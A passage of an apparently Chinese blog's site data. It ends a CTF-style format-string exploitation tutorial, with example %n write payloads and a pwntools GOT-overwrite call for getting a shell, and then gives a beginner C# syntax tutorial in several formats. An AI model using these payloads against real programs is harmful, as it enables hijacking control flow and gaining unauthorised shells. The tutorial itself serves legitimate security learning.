class=\"code\"><pre><span class=\"line\">输入: %10<span class=\"variable\">$n</span></span><br></pre></td></tr></table></figure>\n\n<p>会将输出字符数写入栈上第 11个参数所指向的地址。</p>\n<p><strong>用途：</strong></p>\n<ul>\n<li>任意地址写（最关键的利用手段）。</li>\n<li>可用来覆盖 GOT 表条目（got表可写时，即partial RELRO），把函数指针劫持到 <code>system</code>。</li>\n</ul>\n<hr>\n<h2 id=\"3-常见利用流程\"><a href=\"#3-常见利用流程\" class=\"headerlink\" title=\"3. 常见利用流程\"></a>3. 常见利用流程</h2><ol>\n<li><p><strong>信息泄露</strong></p>\n<ul>\n<li>用 <code>%p</code> 打印大量内容，找到栈上或 GOT&#x2F;PIE 地址。</li>\n<li>用 <code>%s</code> 配合偏移泄露内存，获取 libc 地址。</li>\n</ul>\n</li>\n<li><p><strong>任意写</strong></p>\n<ul>\n<li><p>用 <code>%n</code> 向 GOT 表写入 <code>system</code> 地址，可以用<code>fmtstr_payload(offset, writes, numbwritten, write_size)</code>这个函数改写got表。<code>offset</code>是字符串偏移值，使用pwndbg调试找到输入所在的参数位置，<code>writes</code>是键值对，形如<code>&#123;printf.got:system.plt&#125;</code>，键是要改写的地址，值是目标函数的plt调用地址。后面两个参数一般默认。</p>\n</li>\n<li><p>示例：<code>payload=fmtstr_payload(6,&#123;0x601030:0x40085D&#125;)</code>   </p>\n<p>0x601030指printf的.got.plt地址，0x40085D指system的.plt地址。</p>\n</li>\n</ul>\n</li>\n<li><p><strong>拿 shell</strong></p>\n<ul>\n<li>覆盖 <code>printf</code> 的 GOT 为 <code>system</code>，然后再次调用时输入 <code>/bin/sh</code>。</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"4-小技巧\"><a href=\"#4-小技巧\" class=\"headerlink\" title=\"4. 小技巧\"></a>4. 小技巧</h2><ul>\n<li><p><strong>指定参数位置</strong>：<br> <code>%7$p</code> → 打印第 8个参数；<br> <code>%12$s</code> → 打印第 13个参数指向的字符串。<br> 这样能精确控制泄露和写入。</p>\n</li>\n<li><p><strong>控制写入的值</strong>：<br> <code>%n</code> 写入的是“已经打印的字符数”，所以需要通过 <code>%xxx</code> 的方式控制输出长度。例如：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AAAA%1234c%10<span class=\"variable\">$n</span></span><br></pre></td></tr></table></figure>\n\n<p>会在输出 <code>AAAA</code> 后打印 1234 个字符，总共 1238 个字符，然后把 1238 写入第 11 个参数的地址。   </p>\n</li>\n<li><p><strong>关于offset和%x$的取值</strong>：<br><img src=\"https://img.cdn1.vip/i/68b3bfcf13554_1756610511.webp\" alt=\"exp\"><br>offset&#x3D;x&#x3D;6 + 上图最左边那列的编号数</p>\n</li>\n</ul>\n<hr>\n<h2 id=\"5-总结\"><a href=\"#5-总结\" class=\"headerlink\" title=\"5. 总结\"></a>5. 总结</h2><ul>\n<li><code>%p</code> → 泄露地址。</li>\n<li><code>%s</code> → 任意地址解引用。</li>\n<li><code>%n</code> → 任意地址写（修改 GOT、函数指针）。</li>\n</ul>\n<p>利用链：<br> 信息泄露 → 找 libc → 任意写 → 劫持控制流 → getshell。</p>\n<hr>\n"},{"title":"Day 01 Csharp基础语法","date":"2025-09-01T16:00:00.000Z","top_img":"/images/background/东方/0.jpg","cover":"/images/background/东方/02.jpg","_content":"\n# 🚀 Day 01  C#基础语法\n\nC#（C-Sharp）是微软开发的现代编程语言，运行在 **.NET 平台** 上。它语法与 Java、C++ 相似，但功能更强大，语法更现代化。\n\n C# 的基础语法内容包括：\n\n1. 程序入口\n2. 数据类型\n3. 条件与循环\n4. 方法\n5. 面向对象（OOP）\n6. 语言亮点\n7. 数组与集合\n\n------\n\n## 1️⃣ 程序入口\n\n所有 C# 程序都从 `Main` 方法开始执行：\n\n```csharp\nusing System;\n\nclass Program\n{\n    static void Main(string[] args)\n    {\n        Console.WriteLine(\"Hello, C#!\");\n    }\n}\n```\n\n- `using System;`：引入命名空间（类似 Java 的 `import`）。\n- `class Program`：定义类。\n- `static void Main(string[] args)`：程序入口。\n- `Console.WriteLine()`：打印输出。\n\n------\n\n## 2️⃣ 数据类型\n\nC# 是强类型语言，常见数据类型如下：\n\n```csharp\nint age = 20;           // 整数\ndouble price = 9.99;    // 浮点数\nchar grade = 'A';       // 字符\nstring name = \"Alice\";  // 字符串\nbool isActive = true;   // 布尔\n```\n\n👉 类型推断：\n\n```csharp\nvar city = \"Tokyo\";   // 自动推断 string\nvar number = 123;     // 自动推断 int\n```\n\n👉 常见数值类型范围：\n\n- `int`：32 位整数\n- `long`：64 位整数\n- `float`：32 位浮点数（要加 `f` 后缀，如 `3.14f`）\n- `double`：64 位浮点数\n- `decimal`：高精度小数（常用于金融计算，后缀 `m`）\n\n------\n\n## 3️⃣ 条件与循环\n\n### 条件语句\n\n```csharp\nint age = 18;\n\nif (age >= 18)\n{\n    Console.WriteLine(\"Adult\");\n}\nelse\n{\n    Console.WriteLine(\"Minor\");\n}\n```\n\n`switch` 语句（支持字符串）：\n\n```csharp\nstring color = \"red\";\n\nswitch (color)\n{\n    case \"red\":\n        Console.WriteLine(\"Stop!\");\n        break;\n    case \"green\":\n        Console.WriteLine(\"Go!\");\n        break;\n    default:\n        Console.WriteLine(\"Unknown\");\n        break;\n}\n```\n\n------\n\n### 循环语句\n\n```csharp\n// for 循环\nfor (int i = 0; i < 5; i++)\n{\n    Console.WriteLine(i);\n}\n\n// while 循环\nint n = 0;\nwhile (n < 3)\n{\n    Console.WriteLine(n);\n    n++;\n}\n\n// foreach 循环\nstring[] fruits = { \"Apple\", \"Banana\", \"Orange\" };\nforeach (var f in fruits)\n{\n    Console.WriteLine(f);\n}\n```\n\n------\n\n## 4️⃣ 方法（函数）\n\nC# 方法定义与调用：\n\n```csharp\nstatic int Add(int a, int b)\n{\n    return a + b;\n}\n\nstatic void SayHello(string name = \"World\")  // 默认参数\n{\n    Console.WriteLine(\"Hello, \" + name);\n}\n\nstatic void Main()\n{\n    int result = Add(3, 4);\n    Console.WriteLine(result);   // 7\n\n    SayHello();                  // Hello, World\n    SayHello(\"Alice\");           // Hello, Alice\n}\n```\n\n------\n\n## 5️⃣ 面向对象（OOP）\n\nC# 是 **面向对象语言**，支持类、对象、继承、多态。\n\n```csharp\nclass Person\n{\n    // 属性（自动生成 getter/setter）\n    public string Name { get; set; }\n    public int Age { get; set; }\n\n    // 方法\n    public void Introduce()\n    {\n        Console.WriteLine($\"Hi, I'm {Name}, {Age} years old.\");\n    }\n}\n\nclass Program\n{\n    static void Main()\n    {\n        Person p = new Person { Name = \"Alice\", Age = 20 };\n        p.Introduce();\n    }\n}\n```\n\n👉 属性写法 `public string Name { get; set; }` 比 Java 的 `getter/setter` 简洁很多。\n\n------\n\n## 6️⃣ 语言亮点\n\nC# 有许多现代化特性，比 Java 更简洁：\n\n### 🔹 字符串插值\n\n```csharp\nstring name = \"Alice\";\nint age = 20;\nConsole.WriteLine($\"Hello, I'm {name}, {age} years old.\");\n```\n\n### 🔹 异步编程（async/await）\n\n```csharp\nstatic async Task Download()\n{\n    Console.WriteLine(\"Downloading...\");\n    await Task.Delay(1000);\n    Console.WriteLine(\"Done!\");\n}\n```\n\n### 🔹 LINQ（查询语法）\n\n```csharp\nint[] nums = { 1, 2, 3, 4, 5 };\n\nvar even = from n in nums\n           where n % 2 == 0\n           select n;\n\nforeach (var n in even)\n{\n    Console.WriteLine(n);\n}\n```\n\n------\n\n## 7️⃣ 数组与集合\n\n### 数组\n\n```csharp\nint[] numbers = { 1, 2, 3, 4, 5 };\nConsole.WriteLine(numbers[0]);  // 1\n```\n\n### List（动态数组）\n\n```csharp\nusing System.Collections.Generic;\n\nList<string> list = new List<string>();\nlist.Add(\"Apple\");\nlist.Add(\"Banana\");\n\nforeach (var item in list)\n{\n    Console.WriteLine(item);\n}\n```\n\n### Dictionary（键值对）\n\n```csharp\nDictionary<string, int> scores = new Dictionary<string, int>();\nscores[\"Alice\"] = 90;\nscores[\"Bob\"] = 85;\n\nConsole.WriteLine(scores[\"Alice\"]);  // 90\n```\n\n------\n\n","source":"_posts/Day 01 Csharp基础语法.md","raw":"---\ntitle: Day 01 Csharp基础语法\ndate: 2025-09-02\ntags: 语法糖\ncategories: Csharp\ntop_img: /images/background/东方/0.jpg\ncover: /images/background/东方/02.jpg\n\n---\n\n# 🚀 Day 01  C#基础语法\n\nC#（C-Sharp）是微软开发的现代编程语言，运行在 **.NET 平台** 上。它语法与 Java、C++ 相似，但功能更强大，语法更现代化。\n\n C# 的基础语法内容包括：\n\n1. 程序入口\n2. 数据类型\n3. 条件与循环\n4. 方法\n5. 面向对象（OOP）\n6. 语言亮点\n7. 数组与集合\n\n------\n\n## 1️⃣ 程序入口\n\n所有 C# 程序都从 `Main` 方法开始执行：\n\n```csharp\nusing System;\n\nclass Program\n{\n    static void Main(string[] args)\n    {\n        Console.WriteLine(\"Hello, C#!\");\n    }\n}\n```\n\n- `using System;`：引入命名空间（类似 Java 的 `import`）。\n- `class Program`：定义类。\n- `static void Main(string[] args)`：程序入口。\n- `Console.WriteLine()`：打印输出。\n\n------\n\n## 2️⃣ 数据类型\n\nC# 是强类型语言，常见数据类型如下：\n\n```csharp\nint age = 20;           // 整数\ndouble price = 9.99;    // 浮点数\nchar grade = 'A';       // 字符\nstring name = \"Alice\";  // 字符串\nbool isActive = true;   // 布尔\n```\n\n👉 类型推断：\n\n```csharp\nvar city = \"Tokyo\";   // 自动推断 string\nvar number = 123;     // 自动推断 int\n```\n\n👉 常见数值类型范围：\n\n- `int`：32 位整数\n- `long`：64 位整数\n- `float`：32 位浮点数（要加 `f` 后缀，如 `3.14f`）\n- `double`：64 位浮点数\n- `decimal`：高精度小数（常用于金融计算，后缀 `m`）\n\n------\n\n## 3️⃣ 条件与循环\n\n### 条件语句\n\n```csharp\nint age = 18;\n\nif (age >= 18)\n{\n    Console.WriteLine(\"Adult\");\n}\nelse\n{\n    Console.WriteLine(\"Minor\");\n}\n```\n\n`switch` 语句（支持字符串）：\n\n```csharp\nstring color = \"red\";\n\nswitch (color)\n{\n    case \"red\":\n        Console.WriteLine(\"Stop!\");\n        break;\n    case \"green\":\n        Console.WriteLine(\"Go!\");\n        break;\n    default:\n        Console.WriteLine(\"Unknown\");\n        break;\n}\n```\n\n------\n\n### 循环语句\n\n```csharp\n// for 循环\nfor (int i = 0; i < 5; i++)\n{\n    Console.WriteLine(i);\n}\n\n// while 循环\nint n = 0;\nwhile (n < 3)\n{\n    Console.WriteLine(n);\n    n++;\n}\n\n// foreach 循环\nstring[] fruits = { \"Apple\", \"Banana\", \"Orange\" };\nforeach (var f in fruits)\n{\n    Console.WriteLine(f);\n}\n```\n\n------\n\n## 4️⃣ 方法（函数）\n\nC# 方法定义与调用：\n\n```csharp\nstatic int Add(int a, int b)\n{\n    return a + b;\n}\n\nstatic void SayHello(string name = \"World\")  // 默认参数\n{\n    Console.WriteLine(\"Hello, \" + name);\n}\n\nstatic void Main()\n{\n    int result = Add(3, 4);\n    Console.WriteLine(result);   // 7\n\n    SayHello();                  // Hello, World\n    SayHello(\"Alice\");           // Hello, Alice\n}\n```\n\n------\n\n## 5️⃣ 面向对象（OOP）\n\nC# 是 **面向对象语言**，支持类、对象、继承、多态。\n\n```csharp\nclass Person\n{\n    // 属性（自动生成 getter/setter）\n    public string Name { get; set; }\n    public int Age { get; set; }\n\n    // 方法\n    public void Introduce()\n    {\n        Console.WriteLine($\"Hi, I'm {Name}, {Age} years old.\");\n    }\n}\n\nclass Program\n{\n    static void Main()\n    {\n        Person p = new Person { Name = \"Alice\", Age = 20 };\n        p.Introduce();\n    }\n}\n```\n\n👉 属性写法 `public string Name { get; set; }` 比 Java 的 `getter/setter` 简洁很多。\n\n------\n\n## 6️⃣ 语言亮点\n\nC# 有许多现代化特性，比 Java 更简洁：\n\n### 🔹 字符串插值\n\n```csharp\nstring name = \"Alice\";\nint age = 20;\nConsole.WriteLine($\"Hello, I'm {name}, {age} years old.\");\n```\n\n### 🔹 异步编程（async/await）\n\n```csharp\nstatic async Task Download()\n{\n    Console.WriteLine(\"Downloading...\");\n    await Task.Delay(1000);\n    Console.WriteLine(\"Done!\");\n}\n```\n\n### 🔹 LINQ（查询语法）\n\n```csharp\nint[] nums = { 1, 2, 3, 4, 5 };\n\nvar even = from n in nums\n           where n % 2 == 0\n           select n;\n\nforeach (var n in even)\n{\n    Console.WriteLine(n);\n}\n```\n\n------\n\n## 7️⃣ 数组与集合\n\n### 数组\n\n```csharp\nint[] numbers = { 1, 2, 3, 4, 5 };\nConsole.WriteLine(numbers[0]);  // 1\n```\n\n### List（动态数组）\n\n```csharp\nusing System.Collections.Generic;\n\nList<string> list = new List<string>();\nlist.Add(\"Apple\");\nlist.Add(\"Banana\");\n\nforeach (var item in list)\n{\n    Console.WriteLine(item);\n}\n```\n\n### Dictionary（键值对）\n\n```csharp\nDictionary<string, int> scores = new Dictionary<string, int>();\nscores[\"Alice\"] = 90;\nscores[\"Bob\"] = 85;\n\nConsole.WriteLine(scores[\"Alice\"]);  // 90\n```\n\n------\n\n","slug":"Day 01 Csharp基础语法","published":1,"updated":"2025-09-22T06:06:11.470Z","_id":"cmf24evgc0000nkt88c7c38q4","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"🚀-Day-01-C-基础语法\"><a href=\"#🚀-Day-01-C-基础语法\" class=\"headerlink\" title=\"🚀 Day 01  C#基础语法\"></a>🚀 Day 01  C#基础语法</h1><p>C#（C-Sharp）是微软开发的现代编程语言，运行在 <strong>.NET 平台</strong> 上。它语法与 Java、C++ 相似，但功能更强大，语法更现代化。</p>\n<p> C# 的基础语法内容包括：</p>\n<ol>\n<li>程序入口</li>\n<li>数据类型</li>\n<li>条件与循环</li>\n<li>方法</li>\n<li>面向对象（OOP）</li>\n<li>语言亮点</li>\n<li>数组与集合</li>\n</ol>\n<hr>\n<h2 id=\"1️⃣-程序入口\"><a href=\"#1️⃣-程序入口\" class=\"headerlink\" title=\"1️⃣ 程序入口\"></a>1️⃣ 程序入口</h2><p>所有 C# 程序都从 <code>Main</code> 方法开始执行：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title\">Program</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>(<span class=\"params\"><span class=\"built_in\">string</span>[] <span class=\"keyword\">args</span></span>)</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;Hello, C#!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>using System;</code>：引入命名空间（类似 Java 的 <code>import</code>）。</li>\n<li><code>class Program</code>：定义类。</li>\n<li><code>static void Main(string[] args)</code>：程序入口。</li>\n<li><code>Console.WriteLine()</code>：打印输出。</li>\n</ul>\n<hr>\n<h2 id=\"2️⃣-数据类型\"><a href=\"#2️⃣-数据类型\" class=\"headerlink\" title=\"2️⃣ 数据类型\"></a>2️⃣ 数据类型</h2><p>C# 是强类型语言，常见数据类型如下：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">int</span> age = <span class=\"number\">20</span>;           <span class=\"comment\">// 整数</span></span><br><span class=\"line\"><span class=\"built_in\">double</span> price = <span class=\"number\">9.99</span>;    <span class=\"comment\">// 浮点数</span></span><br><span class=\"line\"><span class=\"built_in\">char</span> grade = <span class=\"string\">&#x27;A&#x27;</span>;       <span class=\"comment\">// 字符</span></span><br><span class=\"line\"><span class=\"built_in\">string</span> name = <span class=\"string\">&quot;Alice&quot;</span>;  <span class=\"comment\">// 字符串</span></span><br><span class=\"line\"><span class=\"built_in\">bool</span> isActive = <span class=\"literal\">true</span>;   <span class=\"comment\">// 布尔</span></span><br></pre></td></tr></table></figure>\n\n<p>👉 类型推断：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> city = <span class=\"string\">&quot;Tokyo&quot;</span>;   <span class=\"comment\">// 自动推断 string</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> number = <span class=\"number\">123</span>;     <span class=\"comment\">// 自动推断 int</span></span><br></pre></td></tr></table></figure>\n\n<p>👉 常见数值类型范围：</p>\n<ul>\n<li><code>int</code>：32 位整数</li>\n<li><code>long</code>：64 位整数</li>\n<li><code>float</code>：32 位浮点数（要加 <code>f</code> 后缀，如 <code>3.14f</code>）</li>\n<li><code>double</code>：64 位浮点数</li>\n<li><code>decimal</code>：高精度小数（常用于金融计算，后缀 <code>m</code>）</li>\n</ul>\n<hr>\n<h2 id=\"3️⃣-条件与循环\"><a href=\"#3️⃣-条件与循环\" class=\"headerlink\" title=\"3️⃣ 条件与循环\"></a>3️⃣ 条件与循环</h2><h3 id=\"条件语句\"><a href=\"#条件语句\" class=\"headerlink\" title=\"条件语句\"></a>条件语句</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">int</span> age = <span class=\"number\">18</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (age &gt;= <span class=\"number\">18</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(<span class=\"string\">&quot;Adult&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(<span class=\"string\">&quot;Minor&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>switch</code> 语句（支持字符串）：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">string</span> color = <span class=\"string\">&quot;red&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">switch</span> (color)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">&quot;red&quot;</span>:</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;Stop!&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">&quot;green&quot;</span>:</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;Go!&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"literal\">default</span>:</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">&quot;Unknown&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"循环语句\"><a href=\"#循环语句\" class=\"headerlink\" title=\"循环语句\"></a>循环语句</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// for 循环</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"built_in\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; i++)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// while 循环</span></span><br><span class=\"line\"><span class=\"built_in\">int</span> n = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">while</span> (n &lt; <span class=\"number\">3</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(n);</span><br><span class=\"line\">    n++;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// foreach 循环</span></span><br><span class=\"line\"><span class=\"built_in\">string</span>[] fruits = &#123; <span class=\"string\">&quot;Apple&quot;</span>, <span class=\"string\">&quot;Banana&quot;</span>, <span class=\"string\">&quot;Orange&quot;</span> &#125;;</span><br><span class=\"line\"><span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> f <span class=\"keyword\">in</span> fruits)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(f);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"4️⃣-方法（函数）\"><a href=\"#4️⃣-方法（函数）\" class=\"headerlink\" title=\"4️⃣ 方法（函数）\"></a>4️⃣ 方法（函数）</h2><p>C# 方法定义与调用：</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"built_in\">int</span> <span class=\"title\">Add</span>(<span class=\"params\"><span class=\"built_in\">int</span> a, <span class=\"built_in\">int</span> b</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a + b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">SayHello</span>(<span class=\"params\"><span class=\"built_in\">string</span> name = <span class=\"string\">&quot;World&quot;</span></span>)  <span class=\"comment\">// 默认参数</span></span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(<span class=\"string\">&quot;Hello, &quot;</span> + name);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">int</span> result = Add(<span class=\"number\">3</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\">    Console.WriteLine(result);   <span class=\"comment\">// 7</span></span><br><span class=\"line\"></span><br><span class=\"line\">    SayHello();                  <span class=\"comment\">// Hello, World</span></span><br><span class=\"line\">    SayHello(<span class=\"string\">&quot;Alice&quot;</span>);           <span class=\"comment\">// Hello, Alice</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"5️⃣-面向对象（OOP）\"><a href=\"#5️⃣-面向对象（OOP）\" class=\"headerlink\" title=\"5️⃣ 面向对象（OOP）\"></a>5️⃣ 面向对象（OOP）</h2><p>C# 是 <strong>面向对象语言</strong>，支持类、对象、继承、多态。</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 属性（自动生成 getter/setter）</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">string</span> Name &#123; <span class=\"keyword\">get</span>; <span class=\"keyword\">set</span>; &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"built_in\">int</span> Age &#123; <span class=\"keyword\">get</span>; <span class=\"keyword\">set</span>; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 方法</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">Introduce</span>()</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        Console.WriteLine(<span class=\"string\">$&quot;Hi, I&#x27;m <span class=\"subst\">&#123;Name&#125;</span>, <span class=\"subst\">&#123;Age&#125;</span> years old.&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title\">Program</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>()</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        Person p = <span class=\"keyword\">new</span> Person &#123; Name = <span class=\"string\">&quot;Alice&quot;</span>, Age = <span class=\"number\">20</span> &#125;;</span><br><span class=\"line\">        p.Introduce();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>👉 属性写法 <code>public string Name &#123; get; set; &#125;</code> 比 Java 的 <code>getter/setter</code> 简洁很多。</p>\n<hr>\n<h2 id=\"6️⃣-语言亮点\"><a href=\"#6️⃣-语言亮点\" class=\"headerlink\" title=\"6️⃣ 语言亮点\"></a>6️⃣ 语言亮点</h2><p>C# 有许多现代化特性，比 Java 更简洁：</p>\n<h3 id=\"🔹-字符串插值\"><a href=\"#🔹-字符串插值\" class=\"headerlink\" title=\"🔹 字符串插值\"></a>🔹 字符串插值</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">string</span> name = <span class=\"string\">&quot;Alice&quot;</span>;</span><br><span class=\"line\"><span class=\"built_in\">int</span> age = <span class=\"number\">20</span>;</span><br><span class=\"line\">Console.WriteLine(<span class=\"string\">$&quot;Hello, I&#x27;m <span class=\"subst\">&#123;name&#125;</span>, <span class=\"subst\">&#123;age&#125;</span> years old.&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"🔹-异步编程（async-await）\"><a href=\"#🔹-异步编程（async-await）\" class=\"headerlink\" title=\"🔹 异步编程（async&#x2F;await）\"></a>🔹 异步编程（async&#x2F;await）</h3><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">async</span> Task <span class=\"title\">Download</span>()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Console.WriteLine(<span class=\"string\">&quot;Downloading...&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">await</span> Task.Delay(<span class=\"number\">1000</span>);</span><br><span class=\"line\">    Console.WriteLine(<span class=\"string\">&quot;Done!&quot;</span>);</span><br><span 